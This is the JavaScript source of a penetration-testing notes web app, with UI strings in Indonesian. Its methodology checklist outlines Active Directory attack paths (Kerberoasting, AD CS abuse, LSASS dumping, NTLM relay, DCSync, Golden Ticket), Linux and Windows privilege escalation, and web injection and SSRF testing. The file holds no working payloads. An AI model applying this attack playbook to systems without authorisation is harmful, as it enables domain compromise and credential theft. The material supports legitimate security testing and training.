    tags: ['nuclei', 'webapp', 'scanning']
  },
];

/* ===================== 2. METHODOLOGY / CHECKLIST DATA ===================== */
/* Each phase: { id, title, items: [{id, label, detail}] } */

const METHODOLOGY = [
  {
    id: 'phase-recon',
    title: '01. RECONNAISSANCE & ENUMERATION',
    items: [
      {
        id: 'rc-1', label: 'Full TCP port sweep before anything else',
        detail: 'Run a fast full-range scan (rustscan or <code>nmap -p- --min-rate 5000</code>) before a detailed scan. Services on non-standard ports (e.g. a web app on 8443, SSH on 2222) are extremely common in CTF/real engagements and are the #1 thing testers miss when they only scan top-1000 ports. Feed discovered ports into a second, deeper <code>-sV -sC</code> scan.'
      },
      {
        id: 'rc-2', label: 'Enumerate all subdomains, not just the root domain',
        detail: 'Combine passive (subfinder, amass -passive, crt.sh) and active (gobuster dns, amass -active -brute) sources, then verify liveness with httpx. Staging, dev, and admin subdomains often run outdated code or skip security controls present on the production app - always in scope of a bug bounty program if they resolve to in-scope infrastructure.'
      },
      {
        id: 'rc-3', label: 'Fingerprint every technology stack (CMS, framework, server, language)',
        detail: 'Use httpx -td, Wappalyzer, or manual header/cookie inspection to identify exact versions (e.g. WordPress 6.1, Apache 2.4.49). Map every version against known CVEs - an outdated component is often the fastest path to a finding, and dictates which wordlists/tools to prioritize next.'
      },
      {
        id: 'rc-4', label: 'Directory & file brute force with a purpose-matched wordlist',
        detail: 'Don\'t just run one wordlist blindly - match it to the tech stack (e.g. WordPress-specific lists for WP sites). Start broad with raft-large-directories.txt, then go deep on any interesting hit. Always fuzz for common backup/config extensions (.bak, .old, .zip, .env, .git) which are frequently left behind by developers.'
      },
      {
        id: 'rc-5', label: 'Crawl the app and mine JS files for hidden endpoints',
        detail: 'Modern SPAs hide most of their attack surface inside JavaScript bundles. Use katana -jc plus gau/waybackurls to gather every historical and current URL, then grep JS files for fetch()/axios calls, hardcoded API keys, and commented-out debug routes.'
      },
      {
        id: 'rc-6', label: 'Check for parameter-based hidden functionality',
        detail: 'Fuzz common parameter names (debug, admin, test, redirect, id, format) against known endpoints with ffuf using a baseline filter (-fs). Hidden parameters frequently unlock debug output, admin mode, or open redirect/SSRF vectors that are invisible in the normal UI flow.'
      },
      {
        id: 'rc-7', label: 'Run an automated vuln scanner (nuclei) as a triage pass',
        detail: 'Nuclei is not a replacement for manual testing but is excellent at catching known-CVE misconfigurations and exposed files quickly across a large scope. Run it early against all live hosts, review every finding manually, then move to manual/targeted testing for anything nuclei can\'t detect (business logic, auth flaws).'
      },
    ]
  },
  {
    id: 'phase-ad',
    title: '02. ACTIVE DIRECTORY ATTACK PATH',
    items: [
      {
        id: 'ad-1', label: 'Establish a foothold: null/guest sessions and anonymous access',
        detail: 'Before any credentials exist, check whether SMB null sessions, anonymous LDAP binds, or guest access are permitted - these can leak the entire user list, password policy, and sometimes readable shares without a single valid credential.'
      },
      {
        id: 'ad-2', label: 'Build a user list and test unauthenticated attacks (AS-REP roast, spraying)',
        detail: 'Once you have usernames (from SMB/LDAP enum, OSINT, or naming convention guessing), test for accounts with Kerberos pre-auth disabled (AS-REP roastable - zero creds needed) and run a careful, lockout-policy-aware password spray with a single common/seasonal password.'
      },
      {
        id: 'ad-3', label: 'With any valid credential, enumerate with BloodHound',
        detail: 'A single low-privilege domain account is often enough to pull the full BloodHound dataset. Always run the "Shortest Path to Domain Admins" and "Find Principals with DCSync Rights" queries first - they frequently reveal the entire attack path in one view.'
      },
      {
        id: 'ad-4', label: 'Hunt for Kerberoastable service accounts',
        detail: 'Any account with an SPN can have its service ticket requested and cracked offline. Prioritize accounts with "svc", "sql", or "admin" in the name - service accounts are frequently configured with weak, never-rotated passwords because they are "invisible" to users.'
      },
      {
        id: 'ad-5', label: 'Check AD CS (Certificate Services) for ESC1-ESC11 misconfigurations',
        detail: 'If certipy find flags any vulnerable template, this is often a direct, low-friction path to Domain Admin (e.g. ESC1 lets a low-priv user request a cert impersonating any user, including a DA). AD CS is frequently deployed with default/weak templates that admins never audit.'
      },
      {
        id: 'ad-6', label: 'Attempt lateral movement with any recovered credential/hash',
        detail: 'Test recovered creds/NTLM hashes against every host in scope with nxc (SMB, WinRM, RDP). Track which hosts grant local admin - that\'s your pivot point for LSASS dumping (Mimikatz) to harvest more credentials/tickets and repeat the cycle.'
      },
      {
        id: 'ad-7', label: 'Look for Responder/relay opportunities on the internal network',
        detail: 'If SMB signing is not enforced on some hosts, a captured NTLM auth attempt (via Responder poisoning LLMNR/NBT-NS) can be relayed live with ntlmrelayx rather than cracked offline - often faster and works even against complex passwords.'
      },
      {
        id: 'ad-8', label: 'Escalate to Domain Admin, then validate impact (DCSync)',
        detail: 'Once you have rights on a path toward DA (via ACL abuse, Kerberoast, ADCS, or relay), confirm full domain compromise with a DCSync (secretsdump) pulling the krbtgt hash - proof of complete domain compromise for the report, enabling Golden Ticket persistence if in scope.'
      },
    ]
  },
  {
    id: 'phase-privesc',
    title: '03. PRIVILEGE ESCALATION',
    items: [
      {
        id: 'pe-1', label: '[Linux] Run LinPEAS and manually verify every high-signal finding',
        detail: 'Never trust automated output blindly - LinPEAS gives you leads, not proof. Manually confirm each flagged SUID binary against GTFOBins, each writable cron script, and each capability before attempting exploitation to avoid wasting time on false positives.'
      },
      {
        id: 'pe-2', label: '[Linux] Check sudo -l output first - it is often the fastest win',
        detail: 'A misconfigured sudoers entry (NOPASSWD on a binary that can read files, write files, or spawn a shell) is frequently the single fastest privesc path. Always check this before diving into SUID/cron/kernel exploit hunting.'
      },
      {
        id: 'pe-3', label: '[Linux] Search the filesystem for stored credentials',
        detail: 'Grep config files, .bash_history, .ssh directories, and web app configs (wp-config.php, .env, database.yml) for hardcoded passwords, API keys, or private SSH keys. Reused credentials between a low-priv shell and root/other services are extremely common.'
      },
      {
        id: 'pe-4', label: '[Linux] Only attempt kernel exploits as a last resort',
        detail: 'Kernel exploits can crash the target - verify the exact kernel version and patch level first, prefer a well-tested exploit (DirtyPipe, PwnKit) matching the exact version, and always have a way to detect/recover from a crash before running it on a production or exam target.'
      },
      {
        id: 'pe-5', label: '[Windows] Run WinPEAS and check whoami /priv immediately',
        detail: 'Dangerous privileges like SeImpersonatePrivilege, SeBackupPrivilege, or SeDebugPrivilege enabled on your token are near-instant SYSTEM escalation paths via well-known tools (PrintSpoofer, GodPotato, robocopy backup tricks) - always check this before deep enumeration.'
      },
      {
        id: 'pe-6', label: '[Windows] Audit service permissions and binary paths',
        detail: 'Check for unquoted service paths with writable parent directories, and use icacls/accesschk to find services whose binary or registry key your current user can modify - either lets you hijack a SYSTEM/admin-run service.'
      },
      {
        id: 'pe-7', label: '[Windows] Check scheduled tasks and startup items for weak ACLs',
        detail: 'A scheduled task or startup script running as SYSTEM/admin that points to a file you can write is a guaranteed win at the next trigger. Cross-check schtasks /query output against icacls on every referenced binary.'
      },
      {
        id: 'pe-8', label: '[Windows] Hunt for stored/cached credentials',
        detail: 'Check unattended.xml, web.config, PowerShell history, saved RDP credential manager entries, and registry autologon keys (HKLM\\...\\Winlogon) - misconfigured deployments frequently leave plaintext or weakly protected credentials behind.'
      },
    ]
  },
  {
    id: 'phase-web',
    title: '04. WEB APPLICATION & API TESTING',
    items: [
      {
        id: 'wv-1', label: 'Map the full attack surface before firing payloads',
        detail: 'Walk the entire application authenticated and unauthenticated, noting every input (params, headers, cookies, file uploads, JSON bodies) and every distinct role. Testing without a full map means missing entire feature areas or IDOR opportunities between roles.'
      },
      {
        id: 'wv-2', label: 'Test injection points systematically (SQLi, NoSQLi, LDAP, XPath, command)',
        detail: 'For every input that touches a backend query/interpreter, test the relevant injection family. Start with error-inducing characters (\', ", `, ;, |) to spot unhandled input, then confirm with time-based or boolean-based blind techniques if no direct error/output is visible.'
      },
      {
        id: 'wv-3', label: 'Test for both reflected and stored XSS across every input',
        detail: 'Reflected XSS shows up immediately in the response; stored XSS requires checking every place the input is later rendered (profile pages, admin panels, logs, notifications) - always test with a unique canary string per input so you can trace exactly which field fired.'
      },
      {
        id: 'wv-4', label: 'Test authorization on every object reference (IDOR/BOLA)',
        detail: 'For every endpoint that accepts an ID (user_id, order_id, doc_id), test accessing it as a different, lower-privileged authenticated user. This is the single most common and most impactful finding class in modern API-driven web apps and is explicitly #1 on the OWASP API Top 10 (BOLA).'
      },
      {
        id: 'wv-5', label: 'Test file upload functionality for extension/content-type/path bypasses',
        detail: 'Try double extensions, case variation, null bytes, content-type spoofing, and polyglot files (valid image header + embedded script). Also test whether the upload path allows direct script execution and whether path traversal in the filename lets you write outside the intended directory.'
      },
      {
        id: 'wv-6', label: 'Test SSRF on every feature that fetches a URL server-side',
        detail: 'Webhooks, PDF generators, image/avatar fetchers, and "import from URL" features are prime SSRF candidates. Test internal IP ranges, loopback, cloud metadata endpoints, and alternate encodings (decimal IP, [::1]) to bypass naive blocklist filters.'
      },
      {
        id: 'wv-7', label: 'Test authentication & session management (JWT, OAuth, SAML)',
        detail: 'For JWT: test alg:none, weak HMAC secrets, and kid header injection. For OAuth: test redirect_uri validation and state parameter CSRF. For SAML: test XML signature wrapping and comment injection. Broken auth is consistently top-3 on both OWASP Top 10 lists.'
      },
      {
        id: 'wv-8', label: 'Test for business logic flaws beyond standard vuln classes',
        detail: 'Price manipulation, race conditions on limited-use coupons/withdrawals, workflow step skipping (bypassing a payment step), and privilege escalation via role parameter tampering rarely show up in scanners and require manually thinking through the app\'s intended logic.'
      },
      {
        id: 'wv-9', label: 'Cover the full OWASP Top 10 (2021) checklist',
        detail: 'A01 Broken Access Control · A02 Cryptographic Failures · A03 Injection · A04 Insecure Design · A05 Security Misconfiguration · A06 Vulnerable & Outdated Components · A07 Identification & Authentication Failures · A08 Software & Data Integrity Failures · A09 Security Logging & Monitoring Failures · A10 Server-Side Request Forgery. Walk this list explicitly for every engagement to avoid tunnel-visioning on just injection/XSS.'
      },
      {
        id: 'wv-10', label: 'Cover the OWASP API Security Top 10 for any API-driven target',
        detail: 'API1 Broken Object Level Authorization · API2 Broken Authentication · API3 Broken Object Property Level Authorization · API4 Unrestricted Resource Consumption · API5 Broken Function Level Authorization · API6 Unrestricted Access to Sensitive Business Flows · API7 SSRF · API8 Security Misconfiguration · API9 Improper Inventory Management · API10 Unsafe Consumption of APIs. Modern targets are increasingly API-first, so this list often matters more than the classic web Top 10.'
      },
    ]
  },


];

/* ===================== 3. STATE / STORAGE ===================== */

const LS_KEYS = {
  allCommands: 'cyberNotes.allCommands.v2',
  checklistProgress: 'cyberNotes.checklistProgress.v2',
  theme: 'cyberNotes.theme.v2',
  dataVersion: 'cyberNotes.dataVersion'
};
const DATA_VERSION = 2;

function safeClone(value) {
  return JSON.parse(JSON.stringify(value));
}

function loadAllCommands() {
  try {
    const raw = localStorage.getItem(LS_KEYS.allCommands);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) return parsed;
    }
  } catch (e) {
    console.warn('Penyimpanan lokal command tidak dapat dibaca:', e);
  }

  const seeded = safeClone(SEED_COMMANDS);
  try {
    localStorage.setItem(LS_KEYS.allCommands, JSON.stringify(seeded));
    localStorage.setItem(LS_KEYS.dataVersion, String(DATA_VERSION));
  } catch (e) {
    console.warn('Penyimpanan lokal tidak tersedia:', e);
  }
  return seeded;
}

function saveAllCommands(list) {
  if (!Array.isArray(list)) return false;
  try {
    localStorage.setItem(LS_KEYS.allCommands, JSON.stringify(list));
    localStorage.setItem(LS_KEYS.dataVersion, String(DATA_VERSION));
    return true;
  } catch (e) {
    console.error('Gagal menyimpan command:', e);
    showToast('Penyimpanan lokal penuh atau diblokir');
    return false;
  }
}

function loadChecklistProgress() {
  try {
    const raw = localStorage.getItem(LS_KEYS.checklistProgress);
    const parsed = raw ? JSON.parse(raw) : {};
    return parsed && typeof parsed === 'object' ? parsed : {};
  } catch (e) { return {}; }
}

function saveChecklistProgress(state) {
  try { localStorage.setItem(LS_KEYS.checklistProgress, JSON.stringify(state)); }
  catch (e) { console.warn('Gagal menyimpan progres checklist'); }
}

let activeCommands = loadAllCommands();
let checklistProgress = loadChecklistProgress();
let currentFilter = 'all';
let currentSearch = '';
let editingCmdId = null;


/* ===================== 4. UTILITIES ===================== */

function showToast(msg) {
  const toast = document.getElementById('toast');
  toast.textContent = msg;
  toast.classList.add('show');
  clearTimeout(showToast._t);
  showToast._t = setTimeout(() => toast.classList.remove('show'), 1800);
}

function catLabel(cat) {
  const map = {
    recon: '01_RECON & WEB ENUM',
    ad: '02_ACTIVE DIRECTORY',
    privesc: '03_PRIVILEGE ESCALATION',
    webapp: '04_WEBAPP / API',
  };
  return map[cat] || cat.toUpperCase();
}

/* ===================== 5. RENDER: COMMAND CENTER ===================== */

function getFilteredCommands() {
  const q = currentSearch.trim().toLowerCase();

  return activeCommands.filter(cmd => {
    // category filter
    if (currentFilter === 'custom' && !cmd.custom) return false;
    if (currentFilter !== 'all' && currentFilter !== 'custom' && cmd.category !== currentFilter) return false;

    if (!q) return true;
    const haystack = [
      cmd.title, cmd.command, cmd.why, cmd.lookfor, catLabel(cmd.category),
      ...(cmd.tags || [])
    ].join(' ').toLowerCase();
    return haystack.includes(q);
  });
}

function renderCommandGrid() {
  const grid = document.getElementById('command-grid');
  const countEl = document.getElementById('results-count');
  const list = getFilteredCommands();

  grid.textContent = ''; // clear safely
  countEl.textContent = `${list.length} command ditemukan`;

  if (list.length === 0) {
    const empty = document.createElement('div');
    empty.className = 'empty-state';
    empty.textContent = '// no results — try a different search or filter';
    grid.appendChild(empty);
    return;
  }

  list.forEach(cmd => grid.appendChild(buildCommandCard(cmd)));
}

function buildCommandCard(cmd) {
  const card = document.createElement('div');
  card.className = 'command-card';
  card.dataset.id = cmd.id;

  // top row: title + category tag
  const top = document.createElement('div');
  top.className = 'card-top';

  const h3 = document.createElement('h3');
  h3.textContent = cmd.title;
  top.appendChild(h3);

  const tag = document.createElement('span');
  tag.className = 'cat-tag';
  tag.textContent = cmd.custom ? '★ CUSTOM · ' + catLabel(cmd.category) : catLabel(cmd.category);
  top.appendChild(tag);
  card.appendChild(top);

  // code box
  const codeBox = document.createElement('div');
  codeBox.className = 'code-box';

  const pre = document.createElement('pre');
  pre.textContent = cmd.command;
  codeBox.appendChild(pre);

  const copyBtn = document.createElement('button');
  copyBtn.className = 'copy-btn';
  copyBtn.type = 'button';
  copyBtn.textContent = '[COPY]';
  copyBtn.addEventListener('click', () => copyCommand(cmd.command, copyBtn));
  codeBox.appendChild(copyBtn);
  card.appendChild(codeBox);

  // WHY
  const why = document.createElement('div');
  why.className = 'info-row';
  const whyB = document.createElement('b');
  whyB.textContent = 'WHY?: ';
  why.appendChild(whyB);
  why.appendChild(document.createTextNode(cmd.why));
  card.appendChild(why);

  // LOOK FOR
  const look = document.createElement('div');
  look.className = 'info-row';
  const lookB = document.createElement('b');
  lookB.textContent = 'LOOK FOR: ';
  look.appendChild(lookB);
  look.appendChild(document.createTextNode(cmd.lookfor));
  card.appendChild(look);

  // tags
  if (cmd.tags && cmd.tags.length) {
    const tagsRow = document.createElement('div');
    tagsRow.className = 'tags-row';
    cmd.tags.forEach(t => {
      const pill = document.createElement('span');
      pill.className = 'tag-pill';
      pill.textContent = '#' + t;
      tagsRow.appendChild(pill);
    });
    card.appendChild(tagsRow);
  }

  // Footer dengan tombol EDIT dan DELETE untuk SEMUA command
  const footer = document.createElement('div');
  footer.className = 'card-footer';
  
  const editBtn = document.createElement('button');
  editBtn.className = 'edit-btn';
  editBtn.type = 'button';
  editBtn.textContent = '[EDIT]';
  editBtn.addEventListener('click', () => openAddModal(cmd));

  const delBtn = document.createElement('button');
  delBtn.className = 'delete-btn';
  delBtn.type = 'button';
  delBtn.textContent = '[HAPUS]';
  delBtn.addEventListener('click', () => deleteCommand(cmd.id));
  
  footer.appendChild(editBtn);
  footer.appendChild(delBtn);
  card.appendChild(footer);

  return card;
}

async function copyCommand(text, btnEl) {
  let copied = false;
  try {
    if (navigator.clipboard?.writeText) {
      await navigator.clipboard.writeText(text);
      copied = true;
    }
  } catch (e) { /* fallback */ }

  if (!copied) {
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.setAttribute('readonly', '');
    ta.style.position = 'fixed';
    ta.style.left = '-9999px';
    document.body.appendChild(ta);
    ta.select();
    try { copied = document.execCommand('copy'); } catch (e) { copied = false; }
    ta.remove();
  }

  if (!copied) {
    showToast('Gagal menyalin command');
    return;
  }

  const original = btnEl.textContent;
  btnEl.textContent = '[TERSALIN]';
  btnEl.classList.add('copied');
  setTimeout(() => { btnEl.textContent = original; btnEl.classList.remove('copied'); }, 1200);
  showToast('Command disalin ke clipboard');
}

function deleteCommand(id) {
  if (!confirm('Delete this command? This cannot be undone.')) return;
  activeCommands = activeCommands.filter(c => c.id !== id);
  saveAllCommands(activeCommands);
  if (editingCmdId === id) editingCmdId = null;
  renderCommandGrid();
  updateActiveFilterButton();
  showToast('Command dihapus');
}

/* ===================== 6. ADD / EDIT COMMAND MODAL ===================== */

function openAddModal(cmdToEdit = null) {
  const modal = document.getElementById('add-modal');
  const titleEl = document.getElementById('modal-title');

  if (cmdToEdit && cmdToEdit.id) {
    editingCmdId = cmdToEdit.id;
    if(titleEl) titleEl.textContent = 'Edit Command';

    document.getElementById('f-title').value = cmdToEdit.title;
    document.getElementById('f-category').value = cmdToEdit.category;
    document.getElementById('f-command').value = cmdToEdit.command;
    document.getElementById('f-why').value = cmdToEdit.why;
    document.getElementById('f-lookfor').value = cmdToEdit.lookfor;
    document.getElementById('f-tags').value = cmdToEdit.tags ? cmdToEdit.tags.join(', ') : '';
  } else {
    editingCmdId = null;
    if(titleEl) titleEl.textContent = 'Tambah Command Manual';
    document.getElementById('add-command-form').reset();
  }

  modal.classList.add('open');
  modal.setAttribute('aria-hidden', 'false');
  document.getElementById('f-title').focus();
}

function closeAddModal() {
  const modal = document.getElementById('add-modal');
  modal.classList.remove('open');
  modal.setAttribute('aria-hidden', 'true');
  document.getElementById('add-command-form').reset();
  editingCmdId = null;
}

function handleAddCommandSubmit(e) {
  e.preventDefault();

  const title = document.getElementById('f-title').value.trim();
  const category = document.getElementById('f-category').value;
  const command = document.getElementById('f-command').value.trim();
  const why = document.getElementById('f-why').value.trim();
  const lookfor = document.getElementById('f-lookfor').value.trim();
  const tagsRaw = document.getElementById('f-tags').value.trim();

  if (!title || !command || !why || !lookfor) {
    showToast('Semua kolom wajib harus diisi');
    return;
  }

  const tags = tagsRaw
    ? [...new Set(tagsRaw.split(',').map(t => t.trim().toLowerCase()).filter(Boolean))].slice(0, 10)
    : [];

  const allowedCategories = new Set(['recon','ad','privesc','webapp','cloud','container','advanced','expert']);
  if (!allowedCategories.has(category) || title.length > 120 || command.length > 4000) {
    showToast('Data command tidak valid');
    return;
  }

  if (editingCmdId) {
    // PROSES EDIT DATA
    const cmdIndex = activeCommands.findIndex(c => c.id === editingCmdId);
    if (cmdIndex > -1) {
      activeCommands[cmdIndex] = {
        ...activeCommands[cmdIndex],
        category, title, command, why, lookfor, tags
      };
      showToast('Command berhasil diperbarui');
    }
  } else {
    // PROSES TAMBAH DATA BARU
    const newCmd = {
      id: 'custom-' + Date.now() + '-' + Math.random().toString(36).slice(2, 7),
      category, title, command, why, lookfor, tags,
      custom: true
    };
    activeCommands.push(newCmd);
    showToast('Command disimpan di penyimpanan lokal');
  }

  saveAllCommands(activeCommands);
  closeAddModal();
  updateActiveFilterButton();
  renderCommandGrid();
}

/* ===================== 7. FILTERS / SEARCH ===================== */

function updateActiveFilterButton() {
  document.querySelectorAll('.filter-btn').forEach(btn => {
    btn.classList.toggle('active', btn.dataset.cat === currentFilter);
  });
}

function initFilters() {
  document.getElementById('filter-bar').addEventListener('click', (e) => {
    const btn = e.target.closest('.filter-btn');
    if (!btn) return;
    currentFilter = btn.dataset.cat;
    updateActiveFilterButton();
    renderCommandGrid();
  });

  const searchInput = document.getElementById('search-input');
  let debounceTimer;
  searchInput.addEventListener('input', (e) => {
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      currentSearch = e.target.value;
      renderCommandGrid();
    }, 120);
  });
}

/* ===================== 8. RENDER: METHODOLOGY ===================== */

function renderMethodology() {
  const container = document.getElementById('checklist-container');
  if (!container) return;
  container.textContent = ''; // Bersihkan kontainer

  METHODOLOGY.forEach(phase => {
    const block = document.createElement('div');
    block.className = 'phase-block';

    // Judul Fase
    const titleBar = document.createElement('div');
    titleBar.className = 'phase-title';
    const titleSpan = document.createElement('span');
    titleSpan.textContent = phase.title;
    titleBar.appendChild(titleSpan);
    
    // Hapus span count phase yang lama
    block.appendChild(titleBar);

    // Isi Item (Tanpa Checkbox, Murni Teks)
    phase.items.forEach(item => {
      const wrap = document.createElement('div');
      wrap.className = 'check-item'; // Pinjam styling check-item agar rapi

      const head = document.createElement('div');
      head.className = 'check-item-head';
      
      const label = document.createElement('label');
      label.textContent = item.label;
      head.appendChild(label);
      wrap.appendChild(head);

      const detail = document.createElement('div');
      detail.className = 'check-detail';
      detail.innerHTML = item.detail;
      wrap.appendChild(detail);

      block.appendChild(wrap);
    });

    container.appendChild(block);
  });

  updateChecklistProgress();
}
function initChecklistControls() {
  const container = document.getElementById('checklist-container');
  const reset = document.getElementById('reset-checklist-btn');
  if (container) {
    container.addEventListener('click', (event) => {
      const checkbox = event.target.closest('input[data-check-id]');
      if (!checkbox) return;
      checklistProgress[checkbox.dataset.checkId] = checkbox.checked;
      saveChecklistProgress(checklistProgress);
      checkbox.closest('.check-item')?.classList.toggle('done', checkbox.checked);
      updateChecklistProgress();
    });
  }
  if (reset) {
    reset.addEventListener('click', () => {
      if (!confirm('Reset semua progres checklist?')) return;
      checklistProgress = {};
      saveChecklistProgress(checklistProgress);
      renderMethodology();
      showToast('Progres checklist direset');
    });
  }
}

/* ===================== 9. VIEW SWITCHING ===================== */

function switchView(viewName) {
  document.querySelectorAll('.view').forEach(v => v.classList.remove('active-view'));
  document.getElementById('view-' + viewName).classList.add('active-view');

  document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.classList.toggle('active', btn.dataset.view === viewName);
  });
}

function initNav() {
  document.querySelectorAll('.nav-btn').forEach(btn => {
    btn.addEventListener('click', () => switchView(btn.dataset.view));
  });
}

/* ===================== 10. THEME SWITCHER ===================== */

function applyTheme(theme) {
  const allowedThemes = new Set(['violet','green','cyan','amber','red','pink']);
  if (!allowedThemes.has(theme)) theme = 'violet';
  document.documentElement.setAttribute('data-theme', theme);
  try { localStorage.setItem(LS_KEYS.theme, theme); } catch (e) { /* ignore */ }
}

function initTheme() {
  const saved = (() => {
    try { return localStorage.getItem(LS_KEYS.theme); } catch (e) { return null; }
  })();
  applyTheme(saved || 'violet');

  const toggle = document.getElementById('theme-toggle');
  const dropdown = document.getElementById('theme-dropdown');

  toggle.addEventListener('click', (e) => {
    e.stopPropagation();
    const open = dropdown.classList.toggle('open');
    toggle.setAttribute('aria-expanded', String(open));
  });

  dropdown.addEventListener('click', (e) => {
    const btn = e.target.closest('button[data-theme]');
    if (!btn) return;
    applyTheme(btn.dataset.theme);
    dropdown.classList.remove('open');
    toggle.setAttribute('aria-expanded', 'false');
  });

  document.addEventListener('click', () => { dropdown.classList.remove('open'); toggle.setAttribute('aria-expanded', 'false'); });
}

/* ===================== 11. INIT ===================== */

function initModal() {
  document.getElementById('add-command-btn').addEventListener('click', () => openAddModal());
  document.getElementById('cancel-add-btn').addEventListener('click', closeAddModal);
  document.getElementById('add-command-form').addEventListener('submit', handleAddCommandSubmit);
  document.getElementById('add-modal').addEventListener('click', (e) => {
    if (e.target.id === 'add-modal') closeAddModal();
  });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeAddModal();
  });
}

function init() {
  initNav();
  initTheme();
  initFilters();
  initModal();
  initChecklistControls();

  renderCommandGrid();
  renderMethodology();
}

init();


/* ===================== 12. TYPEWRITER LOOP ===================== */
const TYPEWRITER_TEXT = 'root@bun4Ted1:~$ ';
let typeWriterTimer = null;

function initTypewriter() {
  const el = document.getElementById('typewriter');
  if (!el) return;
  let index = 0;
  let deleting = false;

  const tick = () => {
    if (document.hidden) {
      typeWriterTimer = setTimeout(tick, 500);
      return;
    }

    if (!deleting) {
      el.textContent = TYPEWRITER_TEXT.slice(0, index + 1);
      index += 1;
      if (index >= TYPEWRITER_TEXT.length) {
        deleting = true;
        typeWriterTimer = setTimeout(tick, 1800);
        return;
      }
      typeWriterTimer = setTimeout(tick, 90);
      return;
    }

    el.textContent = TYPEWRITER_TEXT.slice(0, Math.max(0, index - 1));
    index -= 1;
    if (index <= 0) {
      deleting = false;
      typeWriterTimer = setTimeout(tick, 450);
      return;
    }
    typeWriterTimer = setTimeout(tick, 55);
  };

  clearTimeout(typeWriterTimer);
  el.textContent = '';
  tick();
}

/* Sinkronisasi tab pada browser yang sama. Ini BUKAN sinkronisasi antar pengguna. */
window.addEventListener('storage', (event) => {
  if (event.key === LS_KEYS.allCommands) {
    activeCommands = loadAllCommands();
    renderCommandGrid();
    showToast('Data command disinkronkan dari tab lain');
  }
  if (event.key === LS_KEYS.theme && event.newValue) {
    document.documentElement.setAttribute('data-theme', event.newValue);
  }
});

/* ===================== 13. INIT FINAL ===================== */
const originalInit = init;
init = function () {
  originalInit();
  initTypewriter();
  updateChecklistProgress();
};
